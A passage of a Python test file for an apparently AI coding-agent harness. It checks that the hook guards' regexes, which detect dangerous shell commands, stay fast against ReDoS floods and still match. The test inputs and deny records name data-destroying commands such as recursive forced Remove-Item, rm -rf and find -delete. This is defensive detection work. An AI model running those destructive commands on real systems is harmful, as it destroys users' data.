    """Each ``_DYNAMIC_COMPILE_ALLOWLIST`` entry names a compile that is still
    in its hook file and still unresolvable: an exemption whose call was
    removed or turned literal is a stale hole, so it reds here."""
    live = {
        (path.name, arg)
        for path in sorted(checkout_glob(_HOOKS_DIR, "*.py"))
        for _, pattern, arg in _iter_hook_compiled_patterns(path, with_arg=True)
        if pattern is None
    }
    stale = sorted(set(_DYNAMIC_COMPILE_ALLOWLIST) - live)
    assert not stale, f"dynamic-compile exemptions with no live call: {stale}"


def test_a_second_dynamic_compile_is_not_exempt(tmp_path):
    """The exemption names one call: the same argument compiled in another
    function of the same file reads as a different key, so the gate still
    refuses it (the must-trip twin of the allowlist)."""
    hook = tmp_path / "_integrity.py"
    hook.write_text(
        "import re\n"
        "def _matcher_covers_mutations(matcher):\n    return re.compile(matcher)\n"
        "def another(matcher):\n    return re.compile(matcher)\n",
        encoding="utf-8",
    )
    keys = [(hook.name, arg) for _, pattern, arg in _iter_hook_compiled_patterns(hook, with_arg=True)
            if pattern is None]
    assert len(keys) == 2
    assert [k in _DYNAMIC_COMPILE_ALLOWLIST for k in keys] == [True, False], keys


def test_no_unreviewed_dotstar_in_hook_regexes():
    """Every ``re.compile`` in ``tools/cc/hooks/*.py`` either carries no unbounded
    dot-quantifier or is in ``_DOTSTAR_ALLOWLIST`` with a ReDoS-review reason.

    Earn-the-red: against pre-§7b/§7c HEAD this fails listing
    ``write_guard.py::DANGEROUS_BASH_PATTERNS`` and ``plan_guard.py::_ROOT_SOURCE_HINT`` (un-allowlisted dot-star);
    after the spans are bounded only allowlisted survivors remain
    (``_DOTSTAR_ALLOWLIST``, each pinned live and flagged by
    ``test_every_dotstar_exemption_is_live_and_flagged``) and the gate passes."""
    offenders: list[str] = []
    unresolved: list[str] = []
    hook_files = sorted(checkout_glob(_HOOKS_DIR, "*.py"))
    assert hook_files, f"no hook files found under {_HOOKS_DIR}"
    for path in hook_files:
        for lineno, pattern, arg in _iter_hook_compiled_patterns(path, with_arg=True):
            if pattern is None:
                if (path.name, arg) not in _DYNAMIC_COMPILE_ALLOWLIST:
                    unresolved.append(f"{path.name}:{lineno}")
                continue
            if _pattern_has_unbounded_dotstar(pattern):
                if (path.name, pattern) not in _DOTSTAR_ALLOWLIST:
                    offenders.append(f"{path.name}:{lineno}  {pattern!r}")
    assert not unresolved, (
        "re.compile() with a statically un-reconstructable pattern in a hook "
        "file — the dot-star gate cannot prove it is ReDoS-safe. Make the "
        "pattern a module-level string literal (the gate resolves Name refs, "
        "`+` concatenation, and re.escape() f-strings) or extend the "
        "reconstructor:\n  " + "\n  ".join(unresolved)
    )
    assert not offenders, (
        "Unbounded dot-quantifier (.* / .+ / .*? / .+?) in a hook-runtime regex "
        "not in _DOTSTAR_ALLOWLIST — this is the #5 ReDoS class. Bound the span "
        "(.{0,N}) or, if provably linear, add (filename, pattern) to "
        "_DOTSTAR_ALLOWLIST with a ReDoS-review reason:\n  " + "\n  ".join(offenders)
    )


def test_dotstar_detector_self_check():
    """The detector flags unbounded dot-quantifiers and exempts the §7b/§7c fix
    shape — guards the gate against a detector that quietly stops detecting."""
    for pat in (
        r"a.*b",
        r"x.+y",
        r".*?",
        r".+?",
        r"^## +(.*)$",
        r"\\.*",  # literal backslash `\\` then a REAL dot-metachar (the
        # one-char-lookbehind blind spot that motivated the escape-aware scan)
        r'(?:\\.|[^"])*',  # an escape arm whose sibling takes the backslash too:
        # exponential on a run of backslashes (DEF-5022, air 0effd7)
        r'(?:`.|[^"])*',  # its PowerShell backtick twin
        r'"(\\.|[^"])*"',  # the same alternation as a captured group
    ):
        assert _pattern_has_unbounded_dotstar(pat), f"missed dot-star in {pat!r}"
    for pat in (
        r"a.{0,200}b",  # bounded span (the fix)
        r"\.*literal",  # escaped dot then literal * (no metachar dot)
        r"[.*]+",  # dot+star are literals inside a character class
        r"\w*p\w*i",  # non-dot unbounded quantifiers (out of scope)
        r"[^\n;|&]*?",  # negated-class lazy (out of scope)
        r"\\\.* ",  # escaped backslash THEN escaped dot -> literal, no metachar
    ):
        assert not _pattern_has_unbounded_dotstar(pat), f"false dot-star in {pat!r}"


@pytest.mark.parametrize("pat", [
    r"(?:(?!x).)+?",  # the row's shape: the quantifier sits on the group
    r"(?:(?!\n[ \t]*\n).)*?",  # the recall code-span regex's first cut (84 s on 86 KB)
    r"a(?:(?=y).)*b",  # a lookahead, then the dot
    r"(?:x?.)+",  # a nullable item before the dot
    r"(?:ab|.)*",  # a branch that begins with the dot
    r"((?!x).)+",  # a captured group (the parser flattens (?:(?:.)), never this)
    r"(?:,(?:(?!x).)+){1,3}",  # inside a bounded repeat whose iteration begins with a comma
    r"(?>(?!x).)*",  # an atomic group
    r"x|(\w+ (?:(?!x).)+)",  # the repeat inside a captured group, in a branch
])
def test_dotstar_detector_reads_a_dot_inside_a_quantified_group(pat):
    """An unbounded repeat over a group whose iteration can begin with a bare
    dot is the dot-star family the gate is for (DEF-5022). Red at the base:
    the text scan sees a dot only when the quantifier follows it."""
    assert _pattern_has_unbounded_dotstar(pat), f"missed dot-star in {pat!r}"


@pytest.mark.parametrize("pat", [
    r'"(?:\\.|[^"\\])*"',  # the escape idiom: the dot only after a backslash
    r"'(?:\\.|[^'\\])*'",
    r'(?:`.|""|[^`"])*',  # PowerShell's backtick escape
    r"(?:a.)*",  # the dot after a required literal
    r"(?:(?!x).){0,200}",  # bounded: the fix shape
    r"(?:.){0,5}x",
    r"(?:(?!x)\w)+",  # no dot
    r"(?:.{0})*",  # a dot repeated zero times consumes nothing
    r"(?:\\.|\w)*",  # the sibling cannot begin with the escape character
])
def test_dotstar_detector_leaves_a_dot_behind_a_required_char(pat):
    """A group whose dot follows a required character, the escape idiom 74
    shipped hook patterns carry (census at 0c3e1c0), is linear while no
    sibling arm can begin with that character, and a bounded repeat is the
    fix shape: neither is flagged."""
    assert not _pattern_has_unbounded_dotstar(pat), f"false dot-star in {pat!r}"


def test_every_dotstar_exemption_is_live_and_flagged():
    """Each ``_DOTSTAR_ALLOWLIST`` key is a pattern a hook compiles today and
    one the detector flags, so an exemption outlives neither its pattern nor
    the detector's reading of it. Red at the base: ``^## +(.*)$`` named a
    heading parse `_recall.py` no longer compiles."""
    live = {(path.name, pattern)
            for path in sorted(checkout_glob(_HOOKS_DIR, "*.py"))
            for _, pattern in _iter_hook_compiled_patterns(path)
            if pattern is not None}
    stale = sorted(set(_DOTSTAR_ALLOWLIST) - live)
    assert not stale, f"_DOTSTAR_ALLOWLIST names patterns no hook compiles: {stale}"
    unflagged = sorted(key for key in _DOTSTAR_ALLOWLIST if not _pattern_has_unbounded_dotstar(key[1]))
    assert not unflagged, f"_DOTSTAR_ALLOWLIST exempts patterns the detector does not flag: {unflagged}"


@pytest.mark.parametrize(
    "name,src",
    [
        ("alias", "import re as _ra\nP = _ra.compile(r'v.*danger')\n"),
        ("from_import", "from re import compile\nP = compile(r'v.*danger')\n"),
        ("from_import_as", "from re import compile as _c\nP = _c(r'v.*danger')\n"),
        ("rebind", "import re\n_c = re.compile\nP = _c(r'v.*danger')\n"),
        ("kwarg", "import re\nP = re.compile(pattern=r'v.*danger')\n"),
    ],
)
def test_gate_sees_aliased_compile_spellings(tmp_path, name, src):
    """The completeness gate must recognize ``re.compile`` under aliasing, a
    from-import, a module-level rebind, and the ``pattern=`` kwarg — each is a
    CLEAN bypass of a literal ``re.compile`` matcher (TP-170 §7 verification,
    gate-evasion). Earn-the-red: against the pre-hardening matcher these snippets
    yield NOTHING and the dot-star ships unreviewed; the resolved matcher flags
    the ``v.*danger`` each hides."""
    f = tmp_path / f"_probe_{name}.py"
    f.write_text(src, encoding="utf-8")
    patterns = [p for _, p in _iter_hook_compiled_patterns(f)]
    assert any(p and _pattern_has_unbounded_dotstar(p) for p in patterns), (
        f"gate blind to dot-star via {name!r} compile spelling; saw {patterns!r}"
    )


def test_gate_fails_closed_on_unresolvable_compile_arg(tmp_path):
    """A compile call with no statically-resolvable pattern (``*args`` splat) must
    fail CLOSED — yield ``None`` so the gate's ``unresolved`` assert fires —
    rather than be silently skipped."""
    f = tmp_path / "_probe_splat.py"
    f.write_text("import re\nargs = (r'x',)\nP = re.compile(*args)\n", encoding="utf-8")
    patterns = [p for _, p in _iter_hook_compiled_patterns(f)]
    assert None in patterns, f"splat compile must fail closed (None); saw {patterns!r}"


# ── TP-170 §7d: crafted worst-case pins on the two §7b/§7c-fixed arms ─────────
#
# The completeness gate above is the deterministic earn-the-red for the class.
# These timing pins are the worst-case complement on the SPECIFIC fixed arms,
# driven against the LIVE compiled objects (identity-faithful: exactly what
# check_powershell / bash_has_write_intent run at hook runtime). Measured this
# session: the perl arm was strongly quadratic (1.49s @ 16KB isolated) and earns
# the red here too; Remove-Item was only mildly quadratic (~62ms @ the 32KB cap)
# and the sed arm was already LINEAR (§7c bounds it only for consistency) — for
# those two the GATE, not this timing pin, is what catches a dot-star
# re-introduction. All three are pinned forward regardless.

import plan_guard  # noqa: E402
from write_guard import DANGEROUS_PS_PATTERNS  # noqa: E402

_PS_REMOVE_ITEM_MIXED = next(
    e.pattern
    for e in DANGEROUS_PS_PATTERNS
    if e.pid == "ps-remove-item-recurse-force-mixed"
)


def _assert_search_under_budget(label, fn, payload, budget_s):
    """Run ``fn(payload)`` under a SIGALRM budget; fail on timeout or overrun."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, budget_s)
    t = time.time()
    try:
        fn(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"{label} exceeded {budget_s * 1000:.0f}ms on a {len(payload)}-byte "
            f"payload (catastrophic backtracking — dot-star ReDoS)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < budget_s * 1000, f"{label} took {elapsed_ms:.1f}ms"


def test_plan_guard_perl_arm_linear_isolated():
    """``_SHELL_MUTATE_RE``'s perl arm stays linear on a 20KB ``-pppp…`` run.

    Pre-§7c (``\\bperl\\b.*-\\w*p\\w*i\\b``) this measured ~2.3s on this payload
    (>1s SIGALRM budget = earn-the-red); the ``.{0,200}`` / ``\\w{0,40}`` bound
    drops it to <1ms."""
    payload = "perl -" + "p" * 20000
    _assert_search_under_budget(
        "_SHELL_MUTATE_RE perl arm", plan_guard._SHELL_MUTATE_RE.search, payload,
        _CI_SAFE_BUDGET_MS / 1000.0,
    )


def test_plan_guard_perl_arm_linear_through_chain():
    """Same payload through the real ``bash_has_write_intent`` entrypoint — the
    authoritative hook-runtime reachability (PreToolUse plan-gate)."""
    payload = "perl -" + "p" * 20000
    _assert_search_under_budget(
        "bash_has_write_intent(perl ReDoS)",
        plan_guard.bash_has_write_intent,
        payload,
        _CI_SAFE_BUDGET_MS / 1000.0,
    )


def test_ps_remove_item_mixed_linear_forward_pin():
    """Forward worst-case pin on the live ``Remove-Item`` mixed PS record.

    The GATE is this arm's earn-the-red (it was only ~62ms-quadratic at the 32KB
    cap, under a timing budget). Post-§7b ``.{0,200}`` bounding holds it to
    <1ms; this pin catches a future unbounded re-introduction or a worse-than-
    quadratic regression."""
    payload = "Remove-Item " + "-Recurse" * 3700  # ~30KB, the realistic cap
    _assert_search_under_budget(
        "Remove-Item mixed", _PS_REMOVE_ITEM_MIXED.search, payload, _CI_SAFE_BUDGET_MS / 1000.0
    )


@pytest.mark.parametrize("label, payload", [
    # DEF-822: the switch fragments admit abbreviations and /bin/rm clusters.
    # Each flood aims a fragment's quantifier at its worst case: a run of
    # abbreviated switches scanning toward an absent force, one 30 KB cluster
    # that fails on its last letter (the lookahead form must stay one linear
    # scan), a flood of near-miss clusters, and the colon-bound spelling.
    ("abbreviated-recurse-flood", "Remove-Item " + "-r " * 9000),
    ("one-giant-cluster", "rm -" + "r" * 30000 + "i"),
    ("giant-cluster-force-then-i", "rm -" + "rf" * 15000 + "i"),
    ("near-miss-clusters", "rm " + "-rfi " * 6000),
    ("colon-bound-recurse-flood", "ri " + "-Recurse:$x " * 2500),
    # the code review's shape: MANY command positions, each with a maximal
    # lazy span scanning toward an absent force -- 22x the literal records'
    # constant factor and linear; the pins above are one command position
    # each and certify a 20x cheaper shape (73 ms at 30 KB, measured)
    ("statement-flood-of-abbreviated-removes", ("ri " + "-r " * 70 + ";") * 140),
])
def test_ps_recursive_force_spellings_linear_forward_pin(label, payload):
    """Forward pins on the three consumers of the shared switch fragments:
    the two hard records and the soft tier's regex, then the hard tier's
    entry point that runs the records (`_ps_dangerous_reason`)."""
    from _bash_patterns import _PS_RECURSIVE_FORCE_RE  # noqa: E402
    for name, fn in (
        ("mixed record", _PS_REMOVE_ITEM_MIXED.search),
        ("prefix record", next(e.pattern for e in DANGEROUS_PS_PATTERNS
                               if e.pid == "ps-remove-item-recurse-force-prefix").search),
        ("soft-tier regex", _PS_RECURSIVE_FORCE_RE.search),
        ("_ps_dangerous_reason", lambda p: write_guard._ps_dangerous_reason(p, None)),
    ):
        _assert_search_under_budget(
            f"{name} on {label}", fn, payload, _CHAIN_CEILING_MS / 1000.0)


@pytest.mark.parametrize("label, payload", [
    # DEF-824: the PowerShell sweep classifier walks the directory chain and
    # places every find in its statement; each flood aims at one cost -- the
    # predicate span, the per-statement placement (a cursor, not a rescan),
    # the wrapper run, the root list.
    ("find-predicate-flood", "find . " + "-name x " * 4000 + "-delete"),
    ("find-statement-flood", "find . -delete; " * 1800),
    ("find-wrapper-flood", "sudo env nice find . -delete; " * 900),
    ("find-root-flood", "find " + "a " * 14000 + "-delete"),
    # DEF-822: the pipeline reader -- a flood of pipelines, of enumerator
    # switches scanning toward the pipe, of pipes scanning toward an absent
    # remove verb, and of comma-joined roots
    ("pipeline-flood", "gci -r | ri -r -fo; " * 1500),
    ("enumerator-switch-flood", "gci " + "-r " * 8000 + "| ri -r -fo"),
    ("pipe-flood", "gci " + "| " * 14000 + "x"),
    ("root-list-flood", "gci " + "a," * 12000 + " -r | ri -r -fo"),
    # the review batch: a pipe followed by a line break, a flood of .NET
    # directory deletes, a flood of catch-all filters
    ("pipe-newline-flood", "gci |\n" * 6000),
    ("dotnet-delete-flood", '[IO.Directory]::Delete("x", $true); ' * 800),
    ("catchall-filter-flood", "gci " + "-Include * " * 2500 + "| ri -r -fo"),
])
def test_ps_sweep_classifier_linear_forward_pin(label, payload):
    from _bash_patterns import has_catastrophic_ps_sweep  # noqa: E402
    for name, fn in (
        ("has_catastrophic_ps_sweep", lambda p: has_catastrophic_ps_sweep(p, "/tmp/x")),
        ("_ps_dangerous_reason", lambda p: write_guard._ps_dangerous_reason(p, None)),
    ):
        _assert_search_under_budget(
            f"{name} on {label}", fn, payload, _CI_SAFE_BUDGET_MS / 1000.0)


def test_plan_guard_sed_arm_linear_forward_pin():
    """Forward linearity pin on ``_SHELL_MUTATE_RE``'s sed arm. The sed arm was
    already linear pre-§7c (measured 0.38ms @ 30KB); the ``.{0,200}`` bound is
    for consistency. Pins it so a future change can't quietly make it quadratic."""
    payload = "sed " + "a" * 30000
    _assert_search_under_budget(
        "_SHELL_MUTATE_RE sed arm",
        plan_guard._SHELL_MUTATE_RE.search,
        payload,
        _CI_SAFE_BUDGET_MS / 1000.0,
    )


@pytest.mark.parametrize(
    "command,should_match",
    [
        # §7b: Remove-Item mixed must still catch the spaced-flag form.
        ("Remove-Item -Path C:\\x -Recurse -Force", True),
        ("Remove-Item -Recurse -Force", True),  # also caught by the prefix record
        ("Get-ChildItem -Recurse", False),  # no Remove-Item / -Force
    ],
)
def test_remove_item_mixed_detection_preserved(command, should_match):
    """The §7b span bound must not regress Remove-Item detection."""
    assert bool(_PS_REMOVE_ITEM_MIXED.search(command)) is should_match, (
        f"Remove-Item mixed detection changed for {command!r}"
    )


@pytest.mark.parametrize(
    "command,should_match",
    [
        ("sed -i 's/a/b/' f.txt", True),
        ("sed -e 's/a/b/' -i f.txt", True),
        ("perl -pi -e 's/a/b/' f.txt", True),
        ("perl -pi f.txt", True),
        ("tee out.txt", True),
        ("rm f.txt", True),
        ("echo hi", False),
    ],
)
def test_shell_mutate_detection_preserved(command, should_match):
    """The §7c span bound must not regress ``_SHELL_MUTATE_RE`` detection — all
    of §7c's enumerated mutating forms still match; ``echo hi`` still does not."""
    assert bool(plan_guard._SHELL_MUTATE_RE.search(command)) is should_match, (
        f"_SHELL_MUTATE_RE detection changed for {command!r}"
    )


# ── TP-170 §7-followup: budget pin for the [^x]*TOKEN[^x]* ReDoS the dot-star
#    gate is out-of-scope for (found live by the §7 verification pass) ─────────
#
# _reinject._MARKER_SUBSTRING_RE = ["'][^"']{0,200}MANAGED[^"']{0,200}["']\s+in\b
# was unbounded ([^"']*…[^"']*) and quadratic on a repeated-`MANAGED` quoted run
# (the SAME class as #5 in the double-negated-class spelling). It runs at
# PostToolUse over _reinject._new_content — which is UNCAPPED, unlike write_guard's
# 32KB bash cap — so a large attacker-authored write stalled past the hook timeout
# (measured ~60s @ 256KB end-to-end) = slow-hook fail-open. The dot-star gate
# CANNOT see it (negated-class, not `.`-metachar), so THIS budget pin is the
# pattern's only ReDoS net — it makes the gate docstring's "[^x]* shapes are the
# budget tests' job" claim true for this pattern specifically.

from _reinject import _MARKER_SUBSTRING_RE  # noqa: E402


def test_reinject_marker_substring_re_linear():
    """`_MARKER_SUBSTRING_RE` stays linear on the repeated-`MANAGED` quoted run
    that was quadratic pre-bound. Pre-§7-followup this measured ~1s @ 32KB
    isolated / ~60s @ 256KB through the uncapped PostToolUse path; the
    `[^"']{0,200}` bound holds it to well under the budget."""
    payload = '"' + "MANAGED" * (_WORST_CASE_BODY_LEN // 7)
    _assert_search_under_budget(
        "_MARKER_SUBSTRING_RE", _MARKER_SUBSTRING_RE.search, payload, _CI_SAFE_BUDGET_MS / 1000.0
    )


@pytest.mark.parametrize(
    "text,should_match",
    [
        ('"ESPALIER:MANAGED" in line', True),
        ("'# ESPALIER MANAGED BLOCK' in text", True),
        ('"hello world" in line', False),  # no marker token
    ],
)
def test_reinject_marker_substring_detection_preserved(text, should_match):
    """The `[^"']{0,200}` bound must not regress the forgeable-marker advisory:
    real ``"…MANAGED…" in`` substring tests still match (marker strings are far
    inside 200 chars); a non-marker membership test still does not."""
    assert bool(_MARKER_SUBSTRING_RE.search(text)) is should_match, (
        f"_MARKER_SUBSTRING_RE detection changed for {text!r}"
    )


# ---------------------------------------------------------------------------
# Derived ReDoS population — every extraction regex carries a linear-time budget
#
# Closes DEF-374a. The budget harness above is four HAND-MAINTAINED lists, so a
# regex enrols only if an author remembers. Measured at the time this landed:
# 35 module-level compiled patterns across the two extraction modules, 21 in a
# parametrized list, **14 with no budget at all** -- including four verb regexes
# in the live deny path and `_HARNESS_ENV_PREFIX_RE`, which is the grammar the
# command-position anchor is derived from.
#
# "A subset hard-coded where the actual set should be derived" is the same
# enumeration-integrity defect this repo has now fixed several times. The fix is
# to DERIVE the population from the modules so a new regex self-enrols by
# construction rather than by memory.
#
# This is not theoretical. The command-position anchor shipped a genuine O(n^2)
# regression -- a greedy `\S*` run that scanned past `;` to end-of-input and
# backtracked one character at a time -- and it was caught only because it
# happened to sit in a regex that one older test exercised. Six of the anchored
# regexes had no budget at all and would have carried the same defect unmeasured.


def _derived_extraction_regexes() -> list[tuple[str, "re.Pattern[str]"]]:
    """Every module-level compiled pattern in the two extraction modules.

    Derived, deliberately: the point is that a regex added tomorrow is covered
    without anyone editing a list. Both modules are unioned because the budget
    harness imports from ``write_guard`` while most patterns live in
    ``_bash_patterns`` -- a single-module derivation silently drops
    ``_HARNESS_ENV_PREFIX_RE``, the one pattern the anchor is derived from.
    """
    import _bash_patterns  # noqa: E402

    import write_guard as _wg  # noqa: E402

    _wg._load_the_pattern_path()   # its pattern names bind on first use (DEF-946)
    found: dict[str, "re.Pattern[str]"] = {}
    for module in (_bash_patterns, _wg):
        for attr, value in vars(module).items():
            if isinstance(value, re.Pattern) and attr.endswith("_RE"):
                found.setdefault(attr, value)
    # Also harvest patterns held INSIDE the dangerous-pattern registries. Those
    # records may inline `re.compile(...)` rather than referencing a
    # module-level name, and an inlined pattern is invisible to the scan above
    # — which is exactly how `ps-remove-item-recurse-force-*` sat in the deny
    # path with no linear-time budget. Found while adding the PowerShell
    # harness-env twin: the new pattern was given a module-level name so it
    # would self-enrol, and that raised the question of what else would not.
    for registry in ("DANGEROUS_BASH_PATTERNS", "DANGEROUS_PS_PATTERNS"):
        for record in getattr(_wg, registry, ()) or ():
            pattern = getattr(record, "pattern", None)
            if isinstance(pattern, re.Pattern):
                found.setdefault(f"{registry}:{record.pid}", pattern)
    return sorted(found.items())


_DERIVED_REGEXES = _derived_extraction_regexes()

#: Floor for the derived population. A derivation that silently returns nothing
#: would make every test below vacuously pass, which is the failure mode this
#: whole block exists to remove -- so pin the count and pin known members.
_DERIVED_POPULATION_FLOOR = 30
_DERIVED_MUST_INCLUDE = frozenset({
    "_CP_MV_RE",              # anchored verb regex
    "_LN_S_RE",               # symlink creation into a governed zone
    "_LN_CP_INVOCATION_RE",   # DEF-374a: the regex that had no budget
    "_HARNESS_ENV_PREFIX_RE", # lives in write_guard, not _bash_patterns
})


def _first_use_regexes() -> list[tuple[str, "re.Pattern[str]"]]:
    """The patterns compiled on their first use rather than at import, which
    the derivation above cannot see (it reads module-level ``_RE`` names):
    enrolled BY HAND, each through its accessor, and read by both budget
    arms below beside the derived population (DEF-3063)."""
    import _bash_patterns  # noqa: E402

    return [
        ("_bash_patterns._carrier_fed_remove_re()", _bash_patterns._carrier_fed_remove_re()),
    ]


_FIRST_USE_REGEXES = _first_use_regexes()


def test_every_first_use_compile_is_enrolled():
    """The hand list above is checked against the source: every
    ``re.compile(`` inside a function of `_bash_patterns` names its
    accessor in `_FIRST_USE_REGEXES`, so a pattern compiled on first use
    cannot ship outside both budget arms by being left off the list (the
    failure-mode review of DEF-3063: nothing compared the list with the
    module). Module-level compiles are the derivation's."""
    import ast

    import _bash_patterns  # noqa: E402

    tree = ast.parse(Path(_bash_patterns.__file__).read_text(encoding="utf-8"))
    compiling: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for call in ast.walk(node):
                if (isinstance(call, ast.Call) and isinstance(call.func, ast.Attribute)
                        and call.func.attr == "compile"
                        and isinstance(call.func.value, ast.Name) and call.func.value.id == "re"):
                    compiling.add(node.name)
    enrolled = {name.split(".")[-1].rstrip("()") for name, _ in _FIRST_USE_REGEXES}
    assert compiling == enrolled, (sorted(compiling), sorted(enrolled))

#: Adversarial payload shapes. Each is a repeated token run chosen to stress a
#: DIFFERENT quantifier family. The env-assignment and separator runs are the
#: shapes that caught the anchor's O(n^2) regression; do not drop them.
_ADVERSARIAL_SHAPES: list[tuple[str, str]] = [
    ("space-run", " " * _WORST_CASE_BODY_LEN),
    ("word-run", "a" * _WORST_CASE_BODY_LEN),
    ("path-run", ("a/" * (_WORST_CASE_BODY_LEN // 2))[:_WORST_CASE_BODY_LEN]),
    ("env-assign-run", ("A=1 " * (_WORST_CASE_BODY_LEN // 4))[:_WORST_CASE_BODY_LEN]),
    ("assign-separator-run", ("x=1;" * (_WORST_CASE_BODY_LEN // 4))[:_WORST_CASE_BODY_LEN]),
    ("wrapper-run", ("sudo -u me " * (_WORST_CASE_BODY_LEN // 11))[:_WORST_CASE_BODY_LEN]),
    ("flag-run", ("-a " * (_WORST_CASE_BODY_LEN // 3))[:_WORST_CASE_BODY_LEN]),
    ("quote-run", "'" * _WORST_CASE_BODY_LEN),
]


def test_derived_regex_population_is_non_vacuous():
    """The derivation itself is load-bearing, so pin it both ways.

    A count floor alone is not enough: a derivation that returned the wrong
    module's patterns could still clear it. Pin membership too.
    """
    names = {name for name, _ in _DERIVED_REGEXES}
    assert len(_DERIVED_REGEXES) >= _DERIVED_POPULATION_FLOOR, (
        f"derived ReDoS population collapsed to {len(_DERIVED_REGEXES)} "
        f"(floor {_DERIVED_POPULATION_FLOOR}) — the derivation is broken, not "
        f"the modules. Every budget test below would now pass vacuously."
    )
    missing = _DERIVED_MUST_INCLUDE - names
    assert not missing, (
        f"derived population lost known members {sorted(missing)} — a "
        f"single-module derivation drops _HARNESS_ENV_PREFIX_RE, which is the "
        f"grammar _CMD_POS is derived from"
    )


@pytest.mark.parametrize("name,pattern", _DERIVED_REGEXES + _FIRST_USE_REGEXES)
def test_every_derived_regex_is_linear_on_adversarial_runs(name, pattern):
    """Every derived extraction regex stays inside the budget on every shape.

    Self-enrolling: a regex added to either module is covered here with no edit.
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    derived = [
        (f"derived-run {unit!r}", _run_of(unit, _WORST_CASE_BODY_LEN))
        for unit in _derived_run_units(pattern)
    ]
    for shape_name, payload in [*_ADVERSARIAL_SHAPES, *derived]:
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
        start = time.time()
        try:
            pattern.search(payload)
            elapsed_ms = (time.time() - start) * 1000
        except _Timeout:
            pytest.fail(
                f"{name} exceeded {_CI_SAFE_BUDGET_MS}ms on the {shape_name} "
                f"payload ({len(payload)} chars). A greedy run that can cross a "
                f"command separator is quadratic by construction — bound the "
                f"token class to [^\\s;|&] rather than \\S; where it is bounded "
                f"already, refuse a start inside the run with a leading "
                f"lookbehind (write_guard._CASE_ARM_RE) when every caller "
                f".match()es at the start."
            )
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
            f"{name} took {elapsed_ms:.1f}ms on {shape_name} "
            f"(budget {_CI_SAFE_BUDGET_MS}ms)"
        )


# ── The alarm-free growth arm and the derived run shapes (DEF-3064) ──────────
#
# The budget above arms SIGALRM, so it skips on every Windows interpreter, and
# a Windows seat proves a new pattern with the one gate that would catch it
# switched off: `write_guard._CASE_ARM_RE` took 18.9 s on the word run, built
# and proven on the Windows box, and went red on all four `test-serial` cells
# after the push (run 42573541872, 2026-11-09). Its shapes were a hand list as
# well, with no run of a digit, so the same lane's `_INPUT_REDIRECT_RE` and
# `_OUTPUT_REDIRECT_RE` read about 1 s on a run of `0` at 30000 chars while
# every cell stayed green, and `_ASSIGNMENT_WORD_RE` 0.7 s on a run of `a`,
# which is inside the ceiling: a quadratic that is fast at the cap is not a
# runaway, and only a shape detector sees it.
#
# Two things close it. The arm below needs no alarm: it times `.search` at two
# sizes eight times apart and judges the GROWTH, which the host's speed divides
# out of -- in theory a linear pattern reads 8 and a quadratic one 64, but a
# host's caches do not divide out: on the Windows box (3.11.9) linear patterns
# read up to 20.2 to 21.3 across three passes of the arm (win's four-worker
# tier running beside them), because between 4000 and 16000 chars a run of a
# backslash costs about three times more per doubling, then two again past it
# (`_GIT_CLEAN_RE`: 1.95, 1.97, 2.95, 2.81, 2.17 from 1000 to 32000 chars, the
# same tier beside it); the Linux pass read at most 10.4 and the Mac 8.6 (air,
# 3.14.7, two passes). The limit, `_GROWTH_RATIO_LIMIT`, sits near the
# geometric mean of the worst linear reading and the lowest quadratic one
# (21.3 and 61.5: about 36), set by the worst host measured. And the shapes are derived: a run of one
# character that each repeated single-character class in the pattern accepts
# (:func:`_derived_run_units`), beside the hand list, so a `[0-9]*` brings its
# own run of `0`; the ceiling arm above reads them too.
#
# Why eight, not four: the arm first shipped at 2000 and 8000 with a limit of
# 8, and #547's own 3.11 cell missed the pre-fix redirect patterns (job
# 129105379980): a quadratic that costs 430 ms at 30000 chars in python:3.11
# on Linux reads 31 ms at 8000, and the CI runner, faster, put it under the
# judged floor. At 16000 the same pattern reads 120 ms. Measured 2026-11-09,
# the 221 derived patterns, every hand and derived shape, three samples a
# size, at 2000 and 16000: in python:3.11 (3.11.16, Linux, Docker on the
# Windows box), two passes of 19.5 s, the slowest linear big sample 7.7 ms,
# no pair judged, and the three pre-fix patterns timed below 120 to 148 ms at
# ratios 61.5 to 63.6; on the Windows box (3.11.9), three passes of 24 to
# 26 s, the slowest linear 11.6 ms, no pair judged, the pre-fix patterns 166
# to 209 ms at 62.9 to 68.7.
#
# The window is the speedbump file's (`tests/test_speedbump_irreversible.py::
# _search_window_ms`, DEF-2000): the samples interleave, small then big, each
# size's floor is its reading, and a pair over the limit is asked again as a
# second window judged on its own, the lower ratio the estimate. A pair whose
# big sample is under `_GROWTH_JUDGED_FLOOR_S` is not judged: at single-digit
# milliseconds the ratio is clock noise (a linear row read 10.4 at 7.4 ms in
# the Linux pass). The limit and that floor are bounds on a RED, never ceilings on a
# pass: a host slow throughout lifts both sizes together and leaves the ratio
# where it was, so the wall-clock rule (tests/test_proof_tier.py) pairs
# neither with a floor.
#
# No alarm caps a search here, so the row's time is bounded the way the walker
# row's is (DEF-5023, `_walker_row_budget_s`), with a projection where that
# row's alarm ceiling stands: a deadline at pyproject's per-test timeout less
# `_GROWTH_BUDGET_MARGIN_S`, and every search started only while its projected
# cost still fits before it (:func:`_growth_timed`, the arm's one way to
# search). A big sample is projected from its window's small floor, at least
# two samples, times `_GROWTH_PROJECTION` -- a quadratic's growth -- and is
# asked only while that projection is within `_GROWTH_SEARCH_CAP_S` as well, so
# a pattern too slow at 2000 chars to be asked at 16000 is never asked, and one
# stalled small sample never sets a big sample's projection (air's amendment
# on #547, 1ea8f4). A run the deadline or the cap stops is a red that names the
# run and window in flight, the samples taken, the runs not reached and which
# cause the readings point to (`_growth_stop_red`), never a timeout kill that
# says nothing: the pre-#543 `_CASE_ARM_RE`, whose small floor reads 227 ms on
# the Mac (two windows at 16000 chars about 87 s), is never asked the big size.
# A pattern ends at its first super-linear run. Why a deadline and not the
